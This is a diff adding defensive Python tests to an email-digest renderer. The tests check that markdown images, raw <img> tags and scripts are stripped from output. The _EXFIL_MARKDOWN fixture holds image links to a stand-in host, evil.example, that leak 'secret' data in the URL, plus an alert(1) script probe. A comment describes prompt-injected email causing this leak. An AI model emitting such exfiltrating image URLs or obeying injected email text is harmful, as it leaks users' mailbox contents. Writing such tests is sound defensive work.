@@ -161,6 +161,54 @@ def test_render_html_fragment_returns_no_doctype() -> None:
     assert "embedded" in fragment
 
 
+# A prompt-injected email could make the model emit a remote image whose
+# URL leaks mailbox content when the digest is opened.
+_EXFIL_MARKDOWN = (
+    "Summary\n\n"
+    "![tracking](https://evil.example/md.png?d=secret-subject)\n\n"
+    '<img src="https://evil.example/raw.png?d=secret-body" alt="x">\n\n'
+    "**kept**"
+)
+
+
+def test_render_html_body_strips_images() -> None:
+    """Neither markdown images nor raw <img> survive into the email."""
+    from hyacine.graph.send import render_html_body
+
+    html = render_html_body(_EXFIL_MARKDOWN)
+    assert "<img" not in html.lower()
+    assert "evil.example" not in html
+    assert "kept" in html
+    # The logo is inline SVG added after sanitisation, so it is unaffected.
+    assert "<svg" in html
+
+
+def test_render_html_fragment_strips_images() -> None:
+    """The web UI run page uses the fragment renderer: same allowlist."""
+    from hyacine.graph.send import render_html_fragment
+
+    fragment = render_html_fragment(_EXFIL_MARKDOWN)
+    assert "<img" not in fragment.lower()
+    assert "evil.example" not in fragment
+    assert "kept" in fragment
+
+
+def test_run_page_fallback_sanitiser_strips_images(monkeypatch) -> None:
+    """The run page's ImportError fallback must strip <img> and other tags too."""
+    import sys
+
+    from hyacine.web.routes import runs
+
+    # A None entry makes ``from hyacine.graph.send import ...`` raise ImportError.
+    monkeypatch.setitem(sys.modules, "hyacine.graph.send", None)
+
+    html = runs._render_markdown(_EXFIL_MARKDOWN + "\n\n<script>alert(1)</script>")
+    assert "<img" not in html.lower()
+    assert "evil.example" not in html
+    assert "<script" not in html.lower()
+    assert "<strong>kept</strong>" in html
+
+
 def test_html_lang_reflects_configured_language() -> None:
     """``language`` config must drive ``<html lang>`` (BCP-47 mapping)."""
     from hyacine.graph.send import render_html_body
